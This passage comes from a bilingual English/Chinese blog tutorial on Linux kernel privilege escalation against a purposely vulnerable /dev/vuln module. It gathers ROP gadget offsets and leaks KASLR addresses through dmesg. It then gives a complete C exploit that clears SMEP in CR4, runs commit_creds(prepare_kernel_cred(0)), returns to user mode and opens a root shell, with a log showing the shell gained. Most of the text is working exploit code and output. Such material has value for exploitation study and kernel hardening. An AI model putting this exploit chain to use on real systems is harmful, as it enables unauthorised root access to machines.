<p>We can now extract gadgets with ROPgadget:<br>我们现在可以使用ROPgadget提取gadget：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">~$ ROPgadget --binary bzImage_KASLROFF | grep <span class="string">"pop rdi ; ret"</span></div><div class="line">...</div><div class="line"><span class="number">0xffffffff810b33bd</span> : pop rdi; ret</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>With the same kernel，we collect usefull addresses such as：<br>使用相同的内核，我们收集有用的地址 如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">commit_creds：ffffffff810a1cf0</div><div class="line">prepare_kernel_cred：ffffffff810a2060</div></pre></td></tr></table></figure></p>
<p>The offset for the gadget “pop rdi” is<br>gadget(pop rdi)的偏移量为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"pop RDI ret"</span> - prepare_kernel_creds = <span class="number">0x1135d</span></div></pre></td></tr></table></figure></p>
<p>The offset was found with the kernel KASLR OFF，let’s see if the offset is different with the kernel KASLR ON：<br>在内核KASLR OFF中找到偏移量，让我们看看偏移量是否与内核KASLR ON不同：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">~$ cat /proc/kallsyms | grep prepare_kernel_cred</div><div class="line">ffffffffb90a21c0 T prepare_kernel_cred</div><div class="line">...</div><div class="line">~$ cat /proc/kallsyms | grep commit_creds</div><div class="line">ffffffffb90a1e50 T commit_creds</div><div class="line">...</div><div class="line">(in another terminal)</div><div class="line">...</div><div class="line">(gdb)x / <span class="number">2</span>i ffffffffb90a21c0 + <span class="number">0x1135d</span></div><div class="line"><span class="number">0xffffffffb90b351d</span>:  pop    rdi</div><div class="line"><span class="number">0xffffffffb90b351e</span> : ret</div></pre></td></tr></table></figure></p>
<p>We can do the same to retrieve other gadgets such as：（我们也可以做同样的检索其他gadget，如：）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov</div><div class="line">swapgs</div><div class="line">iretq</div></pre></td></tr></table></figure></p>
<p>Continuing with the kernel KASLR ON,we calculate the offset between the usefull address found in dmesg and prepare_kernel_cred/commit_creds:<br>继续内核KASLR ON，我们计算在dmesg和prepare_kernel_cred/commit_creds中找到的有用地址之间的偏移量<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">~$ dmesg</div><div class="line">...</div><div class="line">[<span class="number">0.208567</span>] Freeing SMP alternatives memory : <span class="number">24</span>K(ffffffffb9ea9000 - ffffffffb9eaf000)</div><div class="line">...</div><div class="line">    ffffffffb9ea9000 - ffffffffb90a1e50 = e071b0   =&gt; commit_creds_offset</div><div class="line">    ffffffffb9ea9000 - ffffffffb90a21c0 = e06e40    =&gt; prepare_kernel_cred_offset</div></pre></td></tr></table></figure></p>
<p>We now have everythings to exploit，so we can set back the kptr_restric protection<br>我们现在有许多东西可以利用，所以可以设置kptr_restric保护</p>
<p>Exploit<br>The Exploit is simple：            （这个利用很简单）<br>    1.execute dmesg                （执行dmesg）<br>    2.find the usefull address    （找到有用的地址）<br>    3.prepare the payload         （准备有效载荷）<br>    4.trigger the vulnerablity     （触发漏洞） </p>
<p>The payload has the following content：（有效载荷具有以下内容）<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">offset before RIP</div><div class="line">POP RDI；RET</div><div class="line">MOV CR4，RDI；RET</div><div class="line">commit_creds(prepare_kernel_cred(0))</div><div class="line">swapgs</div><div class="line">iretq</div><div class="line">safe strucure</div></pre></td></tr></table></figure></p>
<p>Here is the final exploit:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div></pre></td><td class="code"><pre><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;errno.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;assert.h&gt;</div><div class="line">struct cred;</div><div class="line">struct task_struct;</div><div class="line">typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));</div><div class="line">typedef int(*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));</div><div class="line">prepare_kernel_cred_t   prepare_kernel_cred;</div><div class="line">commit_creds_t    commit_creds;</div><div class="line">unsigned long user_cs;</div><div class="line">unsigned long user_ss;</div><div class="line">unsigned long user_rflags;</div><div class="line">unsigned long stack;</div><div class="line">/*</div><div class="line">this function is needed to backup userland env</div><div class="line">these values are necessary just after the iretq calls</div><div class="line">*/</div><div class="line">static void save_state() &#123;</div><div class="line">       asm(</div><div class="line">              "movq %%cs, %0\n"</div><div class="line">              "movq %%ss, %1\n"</div><div class="line">              "pushfq\n"</div><div class="line">              "popq %2\n"</div><div class="line">              : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");</div><div class="line">&#125;</div><div class="line">/* function to get root id */</div><div class="line">void getroot(void)</div><div class="line">&#123;</div><div class="line">       commit_creds(prepare_kernel_cred(0));</div><div class="line">&#125;</div><div class="line">/*</div><div class="line">this function checks if we got the root id and pops a shell if we did</div><div class="line">the memory address of the function is placed in the ROP</div><div class="line">*/</div><div class="line">void shell(void) &#123;</div><div class="line">       printf("[+] getuid() ...");</div><div class="line">       if (!getuid()) &#123;</div><div class="line">              printf(" [root]\n[+] Enjoy your shell...\n");</div><div class="line">              system("/bin/sh");</div><div class="line">       &#125;</div><div class="line">       else &#123;</div><div class="line">              printf("[+] not root\n[+] failed !!!\n");</div><div class="line">       &#125;</div><div class="line">&#125;</div><div class="line">/*</div><div class="line">This function tries to find the usefull addr needed for the expoit</div><div class="line">*/</div><div class="line">unsigned long findAddr() &#123;</div><div class="line">       char line[512];</div><div class="line">       char string[] = "Freeing SMP alternatives memory: 24K";</div><div class="line">       char found[17];</div><div class="line">       unsigned long addr = 0;</div><div class="line">       FILE* file = fopen("/tmp/dmesg", "r");</div><div class="line">       while (fgets(line, sizeof(line), file)) &#123;</div><div class="line">              if (strstr(line, string)) &#123;</div><div class="line">                     strncpy(found, line + 53, 16);</div><div class="line">                     sscanf(found, "%p", (void **)&amp;addr);</div><div class="line">                     break;</div><div class="line">              &#125;</div><div class="line">       &#125;</div><div class="line">       fclose(file);</div><div class="line">       if (addr == 0) &#123;</div><div class="line">              printf("    dmesg error...\n");</div><div class="line">              exit(1);</div><div class="line">       &#125;</div><div class="line">       return addr;</div><div class="line">&#125;</div><div class="line">int main(int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">       int fd;</div><div class="line">       unsigned char payload[237] = &#123; 0 &#125;;</div><div class="line">       unsigned char *p = payload;</div><div class="line">       unsigned long memOffset;</div><div class="line">       /* execute dmesg and place result in a file */</div><div class="line">       printf("[+] Excecute dmesg...\n");</div><div class="line">       system("dmesg &gt; /tmp/dmesg");</div><div class="line">       /* find: Freeing SMP alternatives memory    */</div><div class="line">       printf("[+] Find usefull addr...\n");</div><div class="line">       memOffset = findAddr();</div><div class="line">       printf("    addr[0x%llx]\n", memOffset);</div><div class="line">       /* set value for commit_creds and prepare_kernel_cred */</div><div class="line">       commit_creds = (commit_creds_t)(memOffset - 0xe071b0);</div><div class="line">       prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xe06e40);</div><div class="line">       /* open fd on /dev/vuln                             */</div><div class="line">       printf("[+] Open vuln device...\n");</div><div class="line">       if ((fd = open("/dev/vuln", O_RDWR)) &lt; 0) &#123;</div><div class="line">              printf("    Can't open device file: /dev/vuln\n");</div><div class="line">              exit(1);</div><div class="line">       &#125;</div><div class="line">       /* payload                          */</div><div class="line">       printf("[+] Construct the payload...\n");</div><div class="line">       save_state();</div><div class="line">       /* offset before RIP                    */</div><div class="line">       memcpy(p, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 116);</div><div class="line">       p += 116;</div><div class="line">       /* pop rdi ; ret                    */</div><div class="line">       unsigned long poprdi = (unsigned long)prepare_kernel_cred + 0x1135d;</div><div class="line">       memcpy(p, &amp;poprdi, 8);</div><div class="line">       printf("    pop RDI      at 0x%lx\n", poprdi);</div><div class="line">       p += 8;</div><div class="line">       memcpy(p, "\xf0\x06\x00\x00\x00\x00\x00\x00", 8);   /* SMEP OFF */</div><div class="line">       p += 8;</div><div class="line">       /* mov cr4, rdi ; pop rbp ; ret     */</div><div class="line">       unsigned long movcr4 = (unsigned long)prepare_kernel_cred - 0x86880;</div><div class="line">       memcpy(p, &amp;movcr4, 8);</div><div class="line">       printf("    mov CR4, RDI at 0x%lx\n", movcr4);</div><div class="line">       p += 8;</div><div class="line">       memcpy(p, "\x42\x42\x42\x42\x42\x42\x42\x42", 8);   /* for rbp */</div><div class="line">       p += 8;</div><div class="line">       /* getroot                        */</div><div class="line">       unsigned long gr = (unsigned long)getroot;</div><div class="line">       memcpy(p, &amp;gr, 8);</div><div class="line">       p += 8;</div><div class="line">       /* swapgs; pop rbp; ret           */</div><div class="line">       unsigned long swapgs = (unsigned long)prepare_kernel_cred - 0x3dfbc;</div><div class="line">       printf("    swapgs       at 0x%lx\n", swapgs);</div><div class="line">       memcpy(p, &amp;swapgs, 8);</div><div class="line">       p += 8;</div><div class="line">       memcpy(p, "\x42\x42\x42\x42\x42\x42\x42\x42", 8);   /* for rbp */</div><div class="line">       p += 8;</div><div class="line">       /* iretq                          */</div><div class="line">       unsigned long iretq = (unsigned long)prepare_kernel_cred - 0x61066;</div><div class="line">       printf("    iretq        at 0x%lx\n", iretq);</div><div class="line">       memcpy(p, &amp;iretq, 8);</div><div class="line">       p += 8;</div><div class="line">       /*</div><div class="line">       the stack should look like this after an iretq call</div><div class="line">       RIP</div><div class="line">       CS</div><div class="line">       EFLAGS</div><div class="line">       RSP</div><div class="line">       SS</div><div class="line">       */</div><div class="line">       /* shell                          */</div><div class="line">       unsigned long sh = (unsigned long)shell;</div><div class="line">       memcpy(p, &amp;sh, 8);</div><div class="line">       p += 8;</div><div class="line">       /* user_cs                        */</div><div class="line">       memcpy(p, &amp;user_cs, 8);</div><div class="line">       p += 8;</div><div class="line">       /* user_rflags                    */</div><div class="line">       memcpy(p, &amp;user_rflags, 8);</div><div class="line">       p += 8;</div><div class="line">       /* stack of userspace             */</div><div class="line">       register unsigned long rsp asm("rsp");</div><div class="line">       unsigned long sp = (unsigned long)rsp;</div><div class="line">       memcpy(p, &amp;sp, 8);</div><div class="line">       p += 8;</div><div class="line">       /* user_ss                        */</div><div class="line">       memcpy(p, &amp;user_ss, 8);</div><div class="line">       /* trig the vuln                  */</div><div class="line">       printf("[+] Trig the vulnerablity...\n");</div><div class="line">       write(fd, payload, 221);</div><div class="line">       return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Can I get root please:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">~$ whoami</div><div class="line">blackbunny</div><div class="line">~$ cat /proc/kallsyms | grep commit_creds</div><div class="line">0000000000000000 T commit_creds</div><div class="line">0000000000000000 R __ksymtab_commit_creds</div><div class="line">0000000000000000 r __kcrctab_commit_creds</div><div class="line">0000000000000000 r __kstrtab_commit_creds</div><div class="line">~$ /tmp/exploit</div><div class="line">[+] Excecute dmesg...</div><div class="line">[+] Find usefull addr...</div><div class="line">addr[0xffffffffbeea9000]</div><div class="line">[+] Open vuln device...</div><div class="line">[+] Construct the payload...</div><div class="line">pop RDI      at 0xffffffffbe0b351d</div><div class="line">mov CR4, RDI at 0xffffffffbe01b940</div><div class="line">swapgs       at 0xffffffffbe064204</div><div class="line">iretq        at 0xffffffffbe04115a</div><div class="line">[+] Trig the vulnerablity...</div><div class="line">[+] getuid() ...[root]</div><div class="line">[+] Enjoy your shell...</div><div class="line">~# whoami</div><div class="line">root</div></pre></td></tr></table></figure></p>
<p>原文:<a href="http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/" target="_blank" rel="external">http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://github.com">Let_go</a></p><p> <span>Link:  </span><a href="http://github.com/2018/03/12/Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric/">http://github.com/2018/03/12/Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2018/03/25/CVE-2017-7533/" title="CVE-2017-7533"><span>< PreviousPost</span><br><span class="prevTitle">CVE-2017-7533</span></a><a class="nextSlogan" href="/2017/12/29/CVE-2017-10661/" title="CVE-2017-10661"><span>NextPost ></span><br><span class="nextTitle">CVE-2017-10661</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-Kernel-x86-64-bypass-SMEP-KASLR-kptr-restric"><span class="toc-number">1.</span> <span class="toc-text">Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-背景"><span class="toc-number">1.0.1.</span> <span class="toc-text">Background(背景)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMEP（管理模式执行保护）"><span class="toc-number">1.0.2.</span> <span class="toc-text">SMEP（管理模式执行保护）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KASLR-内核地址空间随机布局"><span class="toc-number">1.0.3.</span> <span class="toc-text">KASLR(内核地址空间随机布局)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-Address-Display-Restriction（内核地址显示限制）"><span class="toc-number">1.0.4.</span> <span class="toc-text">Kernel Address Display Restriction（内核地址显示限制）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation（特权升级）"><span class="toc-number">1.0.5.</span> <span class="toc-text">Privilege escalation（特权升级）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-back-to-user-land（返回用户位置）"><span class="toc-number">1.0.6.</span> <span class="toc-text">Get back to user land（返回用户位置）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.0.7.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerable-module"><span class="toc-number">1.0.8.</span> <span class="toc-text">Vulnerable module</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyse"><span class="toc-number">1.0.9.</span> <span class="toc-text">Analyse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-SMEP"><span class="toc-number">1.0.9.1.</span> <span class="toc-text">Bypass SMEP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-KASLR-and-kptr-restrict"><span class="toc-number">1.0.9.2.</span> <span class="toc-text">Bypass KASLR and kptr_restrict</span></a></li></ol></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>